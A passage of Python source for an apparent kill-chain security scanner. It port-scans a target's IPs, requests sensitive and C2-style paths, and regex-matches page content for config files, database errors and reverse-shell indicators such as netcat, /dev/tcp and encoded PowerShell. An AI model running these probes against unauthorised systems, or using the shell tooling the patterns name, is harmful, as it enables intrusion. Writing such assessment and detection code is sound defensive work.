                tech_exploitability = max(tech_exploitability, rs)
            elif any(kw in title_lower for kw in ["phishing", "upload", "email", "ssrf", "delivery", "form"]):
                delivery_viability = max(delivery_viability, rs)

        if not network_exposure:
            network_exposure = 3.0  # baseline if no network findings
        if not tech_exploitability:
            tech_exploitability = 2.5
        if not delivery_viability:
            delivery_viability = 2.0

        composite = round(network_exposure * 0.4 + tech_exploitability * 0.35 + delivery_viability * 0.25, 2)
        return {
            "network_exposure": round(network_exposure, 2),
            "tech_exploitability": round(tech_exploitability, 2),
            "delivery_viability": round(delivery_viability, 2),
            "composite": composite,
        }

    def _identify_attack_paths(self, findings: List[Dict[str, Any]]) -> List[ExploitPath]:
        """Identify concrete attack paths through the kill chain."""
        paths: List[ExploitPath] = []
        high_risk = [f for f in findings if f.get("risk_score", 0) >= 6.0]
        medium_risk = [f for f in findings if 4.0 <= f.get("risk_score", 0) < 6.0]

        # Build attack paths from chains of findings
        if high_risk:
            paths.append(ExploitPath(
                phases=["reconnaissance", "weaponization", "delivery", "exploitation"],
                description="High-risk direct exploitation path",
                techniques=["T1190", "T1210"],
                prerequisites=[f["title"] for f in high_risk[:3]],
                impact=RiskLevel.HIGH.value,
                feasibility_score=round(min(sum(f.get("risk_score", 0) for f in high_risk[:3]) / 3, 10.0), 2),
                entry_vector="Public-facing application",
                exit_objective="Remote code execution / data breach",
            ))

        if medium_risk:
            paths.append(ExploitPath(
                phases=["reconnaissance", "weaponization", "delivery"],
                description="Medium-risk phishing-based path",
                techniques=["T1566", "T1566.002"],
                prerequisites=[f["title"] for f in medium_risk[:3]],
                impact=RiskLevel.MEDIUM.value,
                feasibility_score=round(min(sum(f.get("risk_score", 0) for f in medium_risk[:3]) / 3, 10.0), 2),
                entry_vector="Phishing email",
                exit_objective="Credential theft / account compromise",
            ))

        # SQLi-specific path
        sqli_findings = [f for f in high_risk if "sql" in f["title"].lower()]
        if sqli_findings:
            paths.append(ExploitPath(
                phases=["reconnaissance", "weaponization", "exploitation", "installation", "actions_on_objectives"],
                description="SQL injection to data exfiltration path",
                techniques=["T1190", "T1059"],
                prerequisites=["SQL injection vulnerability", "Database access"],
                impact=RiskLevel.CRITICAL.value,
                feasibility_score=8.5,
                entry_vector="SQL injection parameter",
                exit_objective="Full database exfiltration",
            ))

        return paths

    def _detect_remote_service_indicators(self) -> List[Dict[str, Any]]:
        """Detect indicators of remote services (SSH, RDP, etc.)."""
        indicators: List[Dict[str, Any]] = []

        # Common ports that indicate remote services
        common_ports = {
            21: "FTP",
            22: "SSH",
            23: "Telnet",
            25: "SMTP",
            53: "DNS",
            80: "HTTP",
            443: "HTTPS",
            445: "SMB",
            1433: "MSSQL",
            1521: "Oracle",
            3306: "MySQL",
            3389: "RDP",
            5432: "PostgreSQL",
            5900: "VNC",
            6379: "Redis",
            8080: "HTTP-Alt",
            8443: "HTTPS-Alt",
            9200: "Elasticsearch",
            27017: "MongoDB",
        }

        # Probe some common ports on resolved IPs
        for ip in self._ips[:2]:  # limit to 2 IPs
            for port, service in common_ports.items():
                if port in (80, 443):  # already checked
                    continue
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(float(self.timeout))
                    result = sock.connect_ex((ip, port))
                    sock.close()
                    if result == 0:
                        indicators.append({
                            "ip": ip,
                            "port": port,
                            "service": service,
                            "status": "open",
                        })
                except (socket.error, OSError):
                    pass

        return indicators

    def _detect_public_facing_apps(self) -> List[Dict[str, str]]:
        """Detect public-facing application endpoints from page content."""
        apps: List[Dict[str, str]] = []

        # Common application paths
        app_paths = [
            "/admin", "/login", "/api", "/dashboard", "/console",
            "/management", "/manager", "/portal", "/control",
            "/wp-admin", "/administrator", "/user", "/profile",
            "/setup", "/install", "/phpmyadmin", "/phpinfo",
        ]

        for path in app_paths:
            if re.search(re.escape(path), self._body_text, re.IGNORECASE):
                apps.append({"path": path, "source": "body_reference"})

        # Check for API endpoints
        api_pattern = re.compile(r'["\'](/api/[a-zA-Z0-9_/-]+)["\']')
        for m in api_pattern.finditer(self._body_text):
            apps.append({"path": m.group(1), "source": "javascript"})

        return apps

    # -----------------------------------------------------------------------
    # Helper methods — Installation
    # -----------------------------------------------------------------------

    def _probe_sensitive_paths(self) -> List[Dict[str, Any]]:
        """Probe sensitive paths for accessibility."""
        exposed: List[Dict[str, Any]] = []

        # Check paths referenced in the page
        for path in SENSITIVE_PATHS:
            if path in self._body_text:
                full_url = self._base_url + path
                status, _, body = _http_fetch(full_url, timeout=self.timeout, verify_tls=self.verify_tls)
                if status == 200:
                    body_len = len(body)
                    exposed.append({
                        "path": path,
                        "url": full_url,
                        "status": status,
                        "body_size": body_len,
                        "source": "direct_probe",
                    })

        return exposed

    def _discover_backup_files(self) -> List[Dict[str, str]]:
        """Discover backup files from page content and common patterns."""
        backups: List[Dict[str, str]] = []
        backup_extensions = [
            ".bak", ".backup", ".old", ".orig", ".save", ".swp",
            ".sql", ".sql.gz", ".tar.gz", ".zip", ".tar", ".7z",
            ".bak.zip", ".sql.bak", ".db", ".sqlite", ".csv",
            "config.php.bak", ".htaccess.bak", "web.config.bak",
        ]
        backup_patterns = [
            r"(?:backup|dump|export|archive|snapshot|bkp)[-_.]",
            r"\.(?:sql|sql\.gz|tar\.gz|zip|bak|backup|old)",
            r"(?:db|database)[-_.]?(?:dump|backup|export)",
        ]

        for pattern in backup_patterns:
            for m in re.finditer(pattern, self._body_text, re.IGNORECASE):
                backups.append({"pattern": m.group(0), "source": "page_content"})

        for ext in backup_extensions:
            if ext in self._body_text.lower():
                backups.append({"pattern": ext, "source": "extension_match"})

        return backups

    def _discover_config_files(self) -> List[Dict[str, str]]:
        """Discover configuration files referenced or accessible."""
        configs: List[Dict[str, str]] = []
        config_names = [
            ".env", ".env.local", ".env.production", ".env.development",
            "config.php", "config.yml", "config.yaml", "config.json",
            "application.yml", "application.properties",
            "settings.py", "local_settings.py",
            "wp-config.php", "configuration.php",
            "database.yml", "secrets.json", "credentials.json",
            "web.config", "app.config", "appsettings.json",
        ]
        for cfg in config_names:
            if cfg.lower() in self._body_text.lower():
                configs.append({"file": cfg, "source": "page_reference"})

        # Check headers for config leaks
        for hdr_key, hdr_val in self._headers.items():
            if any(cfg in hdr_val.lower() for cfg in [".env", "config", "secret", "password"]):
                configs.append({"file": hdr_key, "source": "header_reference", "value_preview": hdr_val[:100]})

        return configs

    def _detect_writeable_indicators(self) -> List[Dict[str, Any]]:
        """Detect indicators of writeable paths."""
        indicators: List[Dict[str, Any]] = []

        # Look for upload directories
        upload_dirs = re.findall(r'["\'](/(?:uploads?|files?|media|content|data|tmp|temp|cache)[^"\']*)["\']', self._body_text, re.IGNORECASE)
        for d in upload_dirs:
            indicators.append({"type": "upload_directory", "path": d})

        # Look for directory listing indicators
        if re.search(r"Index of|Directory listing|Parent Directory", self._body_text, re.IGNORECASE):
            indicators.append({"type": "directory_listing", "path": "multiple"})

        # Check for write hints in headers
        allow_header = self._headers.get("allow", "")
        if "PUT" in allow_header or "WRITE" in allow_header:
            indicators.append({"type": "http_method", "method": "PUT/WRITE"})

        dav_header = self._headers.get("dav", "")
        if dav_header:
            indicators.append({"type": "webdav", "header": dav_header})

        return indicators

    def _detect_cron_indicators(self) -> List[Dict[str, Any]]:
        """Detect cron/scheduled job indicators."""
        indicators: List[Dict[str, Any]] = []

        cron_keywords = [
            r"cron", r"schedule", r"crontab", r"timer", r"job",
            r"celery", r"sidekiq", r"uwsgi", r"supervisor",
            r"systemd", r"init\.d", r"rc\.local",
        ]
        for kw in cron_keywords:
            for m in re.finditer(kw, self._body_text, re.IGNORECASE):
                indicators.append({"type": "scheduled_task", "keyword": m.group(0), "context": m.group(0)[:50]})

        return indicators

    def _detect_startup_exposure(self) -> List[Dict[str, Any]]:
        """Detect startup script exposure indicators."""
        scripts: List[Dict[str, Any]] = []

        startup_files = [
            ".bashrc", ".bash_profile", ".profile", ".bash_history",
            ".zshrc", ".zsh_history",
            "/etc/init.d/", "/etc/rc.local", "/etc/systemd/",
            "docker-compose.yml", "Dockerfile",
        ]
        for sf in startup_files:
            if sf.lower() in self._body_text.lower():
                scripts.append({"type": "startup_file", "file": sf})

        return scripts

    def _detect_database_dumps(self) -> List[Dict[str, Any]]:
        """Detect database dump accessibility indicators."""
        dumps: List[Dict[str, Any]] = []

        dump_keywords = [
            r"dump", r"mysqldump", r"pg_dump", r"mongoexport",
            r"database\s+export", r"sql\s+dump", r"backup.*database",
            r"db_export", r"data_dump", r"schema_dump",
        ]
        for kw in dump_keywords:
            for m in re.finditer(kw, self._body_text, re.IGNORECASE):
                dumps.append({"type": "dump_reference", "pattern": m.group(0), "context": m.group(0)[:80]})

        # Check for database error messages that reveal structure
        error_patterns = [
            r"SQL syntax.*?MySQL",
            r"Warning.*?\Wmysqli?_",
            r"valid MySQL result",
            r"MySqlClient\.",
            r"PostgreSQL.*?ERROR",
            r"Warning.*?\Wpg_",
            r"valid PostgreSQL result",
            r"Driver.*?SQL[\-\_\ ]?Server",
            r"OLE DB.*?SQL Server",
            r"(\bORA-\d{4,5})",
            r"Oracle(?:.*?Driver|.*?Error)",
            r"Warning.*?\Woci_",
            r"Warning.*?\Wora_",
            r"Microsoft Access Driver",
            r"Jet Engine",
            r"Access Database Engine",
            r"SQLite/JDBCDriver",
            r"SQLite\.Exception",
            r"System\.Data\.SQLite",
            r"Warning.*?\Wsqlite_",
            r"Warning.*?\WSQLite3::",
        ]
        for pattern in error_patterns:
            for m in re.finditer(pattern, self._body_text, re.IGNORECASE):
                dumps.append({"type": "db_error", "pattern": m.group(0)[:80], "context": m.group(0)[:120]})

        return dumps

    def _assess_persistence_opportunities(self) -> Dict[str, Any]:
        """Assess overall persistence mechanism opportunities."""
        opportunities: Dict[str, Any] = {
            "mechanisms": [],
            "risk_score": 0.0,
            "count": 0,
        }

        mechanisms = [
            ("webshell_upload", self._find_upload_endpoints(), 8.0),
            ("config_modification", self._discover_config_files(), 7.5),
            ("scheduled_tasks", self._detect_cron_indicators(), 6.5),
            ("startup_modification", self._detect_startup_exposure(), 7.0),
            ("database_persistence", self._detect_database_dumps(), 8.5),
        ]

        for name, data, base_risk in mechanisms:
            if data:
                opportunities["mechanisms"].append({
                    "name": name,
                    "available": True,
                    "base_risk": base_risk,
                    "evidence_count": len(data),
                })
                opportunities["risk_score"] = max(opportunities["risk_score"], base_risk)
                opportunities["count"] += 1
            else:
                opportunities["mechanisms"].append({
                    "name": name,
                    "available": False,
                    "base_risk": base_risk,
                    "evidence_count": 0,
                })

        if opportunities["count"] >= 3:
            opportunities["risk_score"] = min(opportunities["risk_score"] + 1.5, 10.0)

        return opportunities

    # -----------------------------------------------------------------------
    # Helper methods — Command & Control
    # -----------------------------------------------------------------------

    def _detect_c2_paths(self) -> List[Dict[str, str]]:
        """Detect endpoints matching common C2 URI patterns."""
        detected: List[Dict[str, str]] = []

        # Check page content for C2-like paths
        for path in C2_PATH_SIGNATURES:
            # Check body references
            if re.search(re.escape(path), self._body_text, re.IGNORECASE):
                detected.append({"path": path, "source": "page_body"})

            # Check for API patterns
            api_pattern = re.compile(r'["\']([^"\']*' + re.escape(path) + r'[^"\']*)["\']', re.IGNORECASE)
            for m in api_pattern.finditer(self._body_text):
                detected.append({"path": m.group(1), "source": "api_reference"})

        # Also probe actual URLs
        for path in C2_PATH_SIGNATURES[:10]:  # limit probes
            url = self._base_url + path
            status, hdrs, _ = _http_fetch(url, timeout=max(self.timeout, 4), verify_tls=self.verify_tls)
            if status == 200:
                detected.append({"path": path, "source": "direct_probe", "status": status})

        return detected

    def _detect_botnet_signatures(self) -> List[Dict[str, Any]]:
        """Detect botnet-related patterns in page content and headers."""
        signatures: List[Dict[str, Any]] = []

        botnet_patterns = [
            (r"bot[-_]?id", "bot_id"),
            (r"bot[-_]?token", "bot_token"),
            (r"beacon[-_]?id", "beacon_id"),
            (r"implant[-_]?id", "implant_id"),
            (r"agent[-_]?id", "agent_id"),
            (r"worker[-_]?id", "worker_id"),
            (r"poll[-_]?interval", "poll_interval"),
            (r"heartbeat", "heartbeat"),
            (r"jitter", "jitter"),
            (r"kill[-_]?switch", "kill_switch"),
            (r"c2[-_]?server", "c2_server"),
            (r"command[-_]?channel", "command_channel"),
            (r"callback[-_]?url", "callback_url"),
        ]
        for pattern, name in botnet_patterns:
            for m in re.finditer(pattern, self._body_text, re.IGNORECASE):
                signatures.append({"type": name, "pattern": m.group(0), "context": m.group(0)[:80]})

        return signatures

    def _analyze_dns_c2_patterns(self) -> List[Dict[str, Any]]:
        """Analyse DNS patterns for C2-style domain generation."""
        patterns: List[Dict[str, Any]] = []

        # Check for high-entropy subdomains (common in DGA)
        subdomains = self._extract_subdomains_from_page()
        for sub in subdomains:
            sub_parts = sub.split(".")
            for part in sub_parts:
                if len(part) > 12:
                    entropy = _calculate_entropy(part)
                    if entropy > 3.5:
                        patterns.append({
                            "type": "high_entropy_subdomain",
                            "subdomain": sub,
                            "entropy": entropy,
                            "suspicious": entropy > 4.0,
                        })

        # Check for common DGA patterns in page content
        dga_patterns = [
            r"[a-z]{16,}\.[a-z]{2,}",
            r"[a-f0-9]{8,}\.",
        ]
        for pattern in dga_patterns:
            for m in re.finditer(pattern, self._body_text, re.IGNORECASE):
                domain = m.group(0)
                patterns.append({
                    "type": "dga_pattern",
                    "domain": domain,
                    "entropy": _calculate_entropy(domain),
                })

        return patterns

    def _detect_reverse_shell_indicators(self) -> List[Dict[str, Any]]:
        """Detect reverse shell capability indicators."""
        indicators: List[Dict[str, Any]] = []

        shell_patterns = [
            (r"bash\s+-[ci]", "bash_reverse_shell"),
            (r"nc\s+-[elv]", "netcat_listener"),
            (r"python\s+-c\s+.*socket", "python_reverse_shell"),
            (r"perl\s+-e\s+.*socket", "perl_reverse_shell"),
            (r"ruby\s+-e\s+.*socket", "ruby_reverse_shell"),
            (r"php\s+-r\s+.*socket", "php_reverse_shell"),
            (r"exec\s+.*(/dev/tcp|/dev/udp)", "bash_dev_tcp"),
            (r"mkfifo|mknode", "named_pipe"),
            (r"powershell.*-enc", "powershell_encoded"),
            (r"cmd\.exe.*\/c", "cmd_shell"),
            (r"wscript\.shell", "wscript_shell"),
            (r"shellcode", "shellcode_reference"),
            (r"meterpreter", "meterpreter_reference"),
        ]
        for pattern, name in shell_patterns:
            for m in re.finditer(pattern, self._body_text, re.IGNORECASE):
                indicators.append({"type": name, "pattern": m.group(0)[:100]})

        # Check for system command execution endpoints
        cmd_exec_patterns = [
            r"exec\(", r"system\(", r"passthru\(", r"shell_exec\(",
            r"popen\(", r"proc_open\(", r"os\.system\(", r"subprocess\.",
            r"Runtime\.exec", r"ProcessBuilder",
        ]
        for pattern in cmd_exec_patterns:
            for m in re.finditer(pattern, self._body_text, re.IGNORECASE):
                indicators.append({"type": "command_execution", "function": m.group(0), "source": "page_content"})

        return indicators

    def _detect_websocket_endpoints(self) -> List[Dict[str, str]]:
        """Detect WebSocket endpoints in page content."""
        endpoints: List[Dict[str, str]] = []

        ws_patterns = [
            r"ws[s]?://[^\s\"'<>]+",
            r"new\s+WebSocket\s*\(\s*['\"]([^'\"]+)['\"]",
            r"wss?://[^\s\"'<>]+",
            r"socket\.io[^\s\"'<>]*",
        ]
        for pattern in ws_patterns:
            for m in re.finditer(pattern, self._body_text, re.IGNORECASE):
                endpoints.append({"url": m.group(0)[:200], "source": "page_content"})

        return endpoints

    def _analyze_encrypted_channel_potential(self) -> Dict[str, Any]:
        """Analyse potential for encrypted C2 channels."""
        result: Dict[str, Any] = {"description": "", "risk_score": 2.0, "indicators": []}

        # Check TLS version
        tls_version = self._headers.get("alt-svc", "")
        if tls_version:
            result["indicators"].append(f"Alt-SVC: {tls_version[:100]}")

        # Check for HSTS
        hsts = self._headers.get("strict-transport-security", "")
        if hsts:
            result["indicators"].append(f"HSTS: {hsts[:100]}")

        # Check for certificate pinning
        hpkp = self._headers.get("public-key-pins", "")
        if hpkp:
            result["indicators"].append("Public Key Pinning detected")

        # Check if base URL is HTTPS
        if self._base_url.startswith("https://"):
            result["description"] = "Target uses HTTPS — encrypted channels are available"
            result["risk_score"] = 4.0
        else:
            result["description"] = "Target uses HTTP — encrypted channels may be limited"
            result["risk_score"] = 2.0

        # Check for API endpoints that could be tunneled
        api_count = len(re.findall(r'["\'](/api/[^"\']+)["\']', self._body_text))
        if api_count > 0:
            result["indicators"].append(f"{api_count} API endpoints for potential tunneling")
            result["risk_score"] = min(result["risk_score"] + 2.0, 10.0)

        if len(result["indicators"]) > 2:
            result["description"] += f" ({len(result['indicators'])} indicators)"

        return result

    def _detect_proxy_indicators(self) -> List[Dict[str, Any]]:
        """Detect proxy and ingress transfer indicators."""
        indicators: List[Dict[str, Any]] = []

        proxy_headers = ["x-forwarded-for", "x-real-ip", "via", "forwarded", "x-proxy-id"]
        for hdr in proxy_headers:
            if hdr in self._headers:
                indicators.append({"type": "proxy_header", "header": hdr, "value": self._headers[hdr][:100]})

        # Check for CDN/proxy references
        cdn_patterns = [
            r"cloudflare", r"akamai", r"cloudfront", r"fastly",
            r"imperva", r"incapsula", r"sucuri", r"azure[ -]front",
        ]
        headers_str = "\n".join(f"{k}: {v}" for k, v in self._headers.items())
        for pattern in cdn_patterns:
            if re.search(pattern, headers_str + self._body_text, re.IGNORECASE):
                indicators.append({"type": "cdn_proxy", "service": pattern})

        # Check for load balancer indicators
        lb_headers = ["x-load-balancer", "x-lb", "x-backend", "x-server-id"]
        for hdr in lb_headers:
            if hdr in self._headers:
                indicators.append({"type": "load_balancer", "header": hdr})

        return indicators

    # -----------------------------------------------------------------------
    # Helper methods — Actions on Objectives
    # -----------------------------------------------------------------------

    def _score_exfiltration_risk(self) -> Dict[str, float]:
        """Score data exfiltration risk."""
        network_vectors = 0.0
        app_vectors = 0.0

        # Network exfiltration vectors
        if self._ips:
            network_vectors += 2.0
        if self._base_url.startswith("https://"):
            network_vectors += 1.0  # HTTPS can tunnel exfil
        else:
            network_vectors += 2.5  # HTTP is easier to exfil over

        # Check for outbound connection potential
        outbound_patterns = [r"fetch\(", r"XMLHttpRequest", r"\.ajax\(", r"axios", r"WebSocket"]
        for p in outbound_patterns:
            if re.search(p, self._body_text, re.IGNORECASE):
                network_vectors += 0.5

        # Application exfiltration vectors
        upload_endpoints = self._find_upload_endpoints()
        if upload_endpoints:
            app_vectors += 2.5

        ssrf_endpoints = self._detect_ssrf_endpoints()
        if ssrf_endpoints:
            app_vectors += 3.0

        # Check for data-rich endpoints
        data_patterns = [
            r"/api/.*(?:export|download|dump|data|report)",
            r"/(?:export|download|report|backup)",
        ]
        for p in data_patterns:
            if re.search(p, self._body_text, re.IGNORECASE):
                app_vectors += 1.0

        # Check for large response (indicating data-heavy page)
        if len(self._body_bytes) > 100000:
            app_vectors += 1.0

        overall = min(network_vectors + app_vectors, 10.0)
        return {
            "network_vectors": round(network_vectors, 2),
            "app_vectors": round(app_vectors, 2),
            "overall": round(overall, 2),
        }

    def _assess_lateral_movement(self) -> Dict[str, Any]:
        """Assess lateral movement potential."""
        internal_paths = 0
        service_connections = 0

        # Check for internal network references
        internal_patterns = [
            r"10\.\d{1,3}\.\d{1,3}\.\d{1,3}",
            r"172\.(?:1[6-9]|2\d|3[01])\.\d{1,3}\.\d{1,3}",
            r"192\.168\.\d{1,3}\.\d{1,3}",
            r"127\.0\.0\.1",
            r"localhost",
        ]
        for p in internal_patterns:
            matches = re.findall(p, self._body_text)
            internal_paths += len(matches)

        # Check for service-to-service communication patterns
        service_patterns = [
            r"(?:grpc|thrift|protobuf|graphql)",
            r"(?:redis://|memcached://|amqp://|rabbitmq://)",
            r"(?:jdbc:|mysql://|postgres://|mongodb://)",
            r"(?:internal[-_]?api|service[-_]?mesh|micro[-_]?service)",
        ]
        for p in service_patterns:
            if re.search(p, self._body_text, re.IGNORECASE):
                service_connections += 1

        # Check for Kubernetes/Docker indicators
        k8s_patterns = [r"kubernetes", r"k8s", r"docker", r"container", r"pod"]
        for p in k8s_patterns:
            if re.search(p, self._body_text, re.IGNORECASE):
                service_connections += 1

        score = min(internal_paths * 1.0 + service_connections * 1.5, 10.0)
        score = max(score, 1.0)  # baseline

        return {
            "score": round(score, 2),
            "internal_paths": internal_paths,
            "service_connections": service_connections,
        }

    def _identify_privesc_paths(self) -> List[Dict[str, Any]]:
        """Identify privilege escalation paths."""
        paths: List[Dict[str, Any]] = []

        # Admin interface detection
        admin_patterns = [
            r"/admin", r"/administrator", r"/wp-admin", r"/manager",
            r"/superuser", r"/root", r"/sysadmin", r"/cpanel",
            r"/plesk", r"/webmin", r"/useradmin", r"/moderator",
        ]
        for p in admin_patterns:
            if re.search(p, self._body_text, re.IGNORECASE):
                paths.append({
                    "type": "admin_interface",
                    "pattern": p,
                    "risk_score": 7.5,
                    "description": f"Admin interface reference found: {p}",
                })

        # Role/permission indicators
        role_patterns = [
            r"admin|administrator|superuser|root|sysadmin",
            r"role|permission|privilege|authorization",
            r"is_admin|is_superuser|is_staff|has_role",
        ]
        for p in role_patterns:
            if re.search(p, self._body_text, re.IGNORECASE):
                paths.append({
                    "type": "role_system",
                    "pattern": p,
                    "risk_score": 6.0,
                    "description": f"Role/permission system detected: {p}",
                })

        # Sudo/Su indicators
        if re.search(r"sudo|su\s|runas|privilege", self._body_text, re.IGNORECASE):
            paths.append({
                "type": "elevation_mechanism",
                "pattern": "sudo/su/runas",
                "risk_score": 7.0,
                "description": "Privilege elevation mechanism reference detected",
            })

        # API key/token patterns
        api_key_patterns = [
            r"(?:api[_-]?key|apikey|api[_-]?token|access[_-]?token|secret[_-]?key)",
        ]
        for p in api_key_patterns:
            if re.search(p, self._body_text, re.IGNORECASE):
                paths.append({
                    "type": "api_key_system",
                    "pattern": p,
                    "risk_score": 6.5,
                    "description": "API key/token system reference found",
                })

        return sorted(paths, key=lambda x: x["risk_score"], reverse=True)

    def _calculate_business_impact(self) -> Dict[str, Any]:
        """Calculate potential business impact."""
        financial: float = 3.0
        reputational: float = 3.0
        operational: float = 3.0
        compliance: float = 3.0
        indicators: List[str] = []

        # Financial indicators
        if re.search(r"(?:payment|billing|checkout|invoice|receipt|transaction|credit|debit|bank)", self._body_text, re.IGNORECASE):
            financial = 8.5
            indicators.append("Payment/financial data processing detected")

        if re.search(r"(?:price|cost|subscription|plan|premium|enterprise)", self._body_text, re.IGNORECASE):
            financial = max(financial, 6.0)
            indicators.append("Pricing/subscription system detected")

        # Reputational indicators
        if re.search(r"(?:customer|client|user|review|testimonial|feedback)", self._body_text, re.IGNORECASE):
            reputational = 6.5
            indicators.append("Customer-facing platform detected")

        if re.search(r"(?:social|community|forum|blog|news)", self._body_text, re.IGNORECASE):
            reputational = max(reputational, 7.5)
            indicators.append("Public content platform detected")

        # Operational indicators
        if re.search(r"(?:admin|manage|dashboard|monitor|analytics|report)", self._body_text, re.IGNORECASE):
            operational = 6.0
            indicators.append("Management/dashboard system detected")

        if re.search(r"(?:api|service|microservice|worker|queue|job)", self._body_text, re.IGNORECASE):
            operational = max(operational, 7.0)
            indicators.append("API/service infrastructure detected")

        # Compliance indicators
        if re.search(r"(?:gdpr|hipaa|pci|sox|soc|iso\s*27001|privacy|consent|cookie)", self._body_text, re.IGNORECASE):
            compliance = 8.0
            indicators.append("Regulatory compliance framework detected")

        if re.search(r"(?:health|medical|patient|phi|phi|ehr|emr)", self._body_text, re.IGNORECASE):
            compliance = max(compliance, 9.5)
            indicators.append("Healthcare data handling detected (HIPAA)")

        if re.search(r"(?:financial|banking|securities|trade)", self._body_text, re.IGNORECASE):
            compliance = max(compliance, 9.0)
            indicators.append("Financial data handling detected (PCI-DSS)")

        overall_score = round(financial * 0.3 + reputational * 0.25 + operational * 0.2 + compliance * 0.25, 2)

        return {
            "financial": RiskLevel.CRITICAL.value if financial >= 8 else _classify_score(financial),
            "reputational": _classify_score(reputational),
            "operational": _classify_score(operational),
            "compliance": RiskLevel.CRITICAL.value if compliance >= 8 else _classify_score(compliance),
            "overall_score": overall_score,
            "indicators": indicators,
        }

    def _infer_data_classification(self) -> Dict[str, Any]:
        """Infer data classification based on page content analysis."""
        data_types: List[str] = []
        sensitivity_score = 0.0

        # PII detection
        pii_patterns = [
            (r"email|e[-_]?mail", "Email addresses"),
            (r"phone|mobile|telephone", "Phone numbers"),
            (r"address|street|city|zip|postal", "Physical addresses"),
            (r"ssn|social\s*security", "Social Security Numbers"),
            (r"date\s*of\s*birth|dob|birthday", "Dates of birth"),
            (r"passport|license|id[_-]?number", "Government IDs"),
            (r"credit[-_]?card|card[-_]?number|cvv|expiry", "Payment card data"),
            (r"bank[-_]?account|routing|iban|swift", "Banking details"),
            (r"username|password|credential", "Credentials"),
            (r"first[-_]?name|last[-_]?name|full[-_]?name", "Personal names"),
        ]
        for pattern, dtype in pii_patterns:
            if re.search(pattern, self._body_text, re.IGNORECASE):
                data_types.append(dtype)
                sensitivity_score += 1.5

        # PHI detection
        phi_patterns = [
            (r"patient|medical|health|diagnosis|treatment|prescription", "Protected Health Information"),
            (r"doctor|physician|hospital|clinic|pharmacy", "Healthcare provider data"),
            (r"insurance|claim|coverage|benefit", "Insurance data"),
        ]
        for pattern, dtype in phi_patterns:
            if re.search(pattern, self._body_text, re.IGNORECASE):
                data_types.append(dtype)
                sensitivity_score += 2.0

        # Sensitive business data
        biz_patterns = [
            (r"revenue|profit|income|financial|earnings", "Financial data"),
            (r"trade[-_]?secret|proprietary|confidential", "Trade secrets"),
            (r"source[-_]?code|repository|git", "Source code"),
            (r"api[-_]?key|secret|token|private[-_]?key", "Cryptographic keys/secrets"),
        ]
        for pattern, dtype in biz_patterns:
            if re.search(pattern, self._body_text, re.IGNORECASE):
                data_types.append(dtype)
                sensitivity_score += 1.5

        if not data_types:
            data_types.append("General content")
            sensitivity_score = 1.0

        sensitivity_score = min(sensitivity_score, 10.0)

        if sensitivity_score >= 8.0:
            level = "HIGHLY_SENSITIVE"
        elif sensitivity_score >= 5.0:
            level = "SENSITIVE"
        elif sensitivity_score >= 3.0:
            level = "INTERNAL"
        else:
            level = "PUBLIC"

        return {
            "sensitivity_level": level,
            "sensitivity_score": round(sensitivity_score, 2),
            "data_types": data_types,
            "risk_score": sensitivity_score,
        }

    def _assess_dos_impact(self) -> Dict[str, Any]:
        """Assess denial of service impact potential."""
        vectors: List[str] = []
        dos_score = 2.0

        # Resource-heavy endpoints
        if re.search(r"/(?:search|query|report|export|download|generate)", self._body_text, re.IGNORECASE):
            vectors.append("Resource-intensive endpoints")
            dos_score += 2.0

        # File upload without limits
        if re.search(r"upload", self._body_text, re.IGNORECASE):
            vectors.append("File upload endpoints")
            dos_score += 1.5

        # API endpoints
        api_count = len(re.findall(r"/api/", self._body_text))
        if api_count > 5:
            vectors.append(f"Multiple API endpoints ({api_count})")
            dos_score += 1.5

        # No rate limiting indicators
        rate_limit_headers = ["x-ratelimit", "x-rate-limit", "retry-after"]
        has_rate_limiting = any(h in self._headers for h in rate_limit_headers)
        if not has_rate_limiting:
            vectors.append("No rate limiting detected")
            dos_score += 2.0

        # CDN/protection
        cdn_patterns = [r"cloudflare", r"akamai", r"fastly", r"imperva"]
        headers_str = "\n".join(f"{k}: {v}" for k, v in self._headers.items())
        has_cdn = any(re.search(p, headers_str, re.IGNORECASE) for p in cdn_patterns)
        if not has_cdn:
            vectors.append("No CDN/DDoS protection detected")
            dos_score += 1.5
        else:
            dos_score -= 1.0

        # Database-heavy operations
        if re.search(r"(?:database|sql|query|select|join)", self._body_text, re.IGNORECASE):
            vectors.append("Database operations possible")
            dos_score += 1.0

        dos_score = max(min(round(dos_score, 2), 10.0), 1.0)

        if dos_score >= 8.0:
            impact_level = "HIGH"
        elif dos_score >= 5.0:
            impact_level = "MEDIUM"
        else:
            impact_level = "LOW"

        return {
            "risk_score": dos_score,
            "impact_level": impact_level,
            "vectors": vectors,
            "rate_limiting": has_rate_limiting,
            "cdn_protection": has_cdn,
        }

    # DEAD CODE: consider removal
    def _analyze_alternate_exfiltration(self) -> List[Dict[str, Any]]:
        """Analyse alternate exfiltration protocol opportunities."""
        protocols: List[Dict[str, Any]] = []

        # DNS exfiltration potential
        if re.search(r"dns|resolve|lookup", self._body_text, re.IGNORECASE):
            protocols.append({
                "protocol": "DNS",
                "method": "DNS tunneling",
                "feasibility": 6.5,
                "description": "DNS resolution capability could enable DNS-based exfiltration",
            })

        # ICMP tunneling potential
        protocols.append({
            "protocol": "ICMP",
            "method": "ICMP tunneling",
            "feasibility": 4.0,
            "description": "ICMP tunneling possible if network allows outbound ICMP",
        })

        # HTTP-based exfiltration
        protocols.append({
            "protocol": "HTTP",
            "method": "HTTP GET/POST parameter encoding",
            "feasibility": 7.5,
            "description": "Data can be exfiltrated via HTTP request parameters",
        })

        # HTTPS exfiltration
        if self._base_url.startswith("https://"):
            protocols.append({
                "protocol": "HTTPS",
                "method": "TLS-encrypted exfiltration",
                "feasibility": 8.0,
                "description": "HTTPS provides covert encrypted exfiltration channel",
            })

        # WebSocket exfiltration
        ws_endpoints = self._detect_websocket_endpoints()
        if ws_endpoints:
            protocols.append({
                "protocol": "WebSocket",
                "method": "Bidirectional data exfiltration",
                "feasibility": 7.0,
                "description": f"WebSocket endpoints available for bidirectional exfiltration",
            })

        # Email exfiltration
        mx_records = self._check_mx_records()
        if mx_records:
            protocols.append({
                "protocol": "SMTP",
                "method": "Email-based exfiltration",
                "feasibility": 5.5,
                "description": "Mail infrastructure could be leveraged for data exfiltration",
            })

        return protocols


# ---------------------------------------------------------------------------
# Module-level convenience function
# ---------------------------------------------------------------------------

# DEAD CODE: consider removal
def run_kill_chain_scan(
    target: str,
    base_url: str,
    timeout: int = 8,
    verify_tls: bool = True,
) -> Dict[str, Any]:
    """Convenience function to run a full kill-chain scan.

    Args:
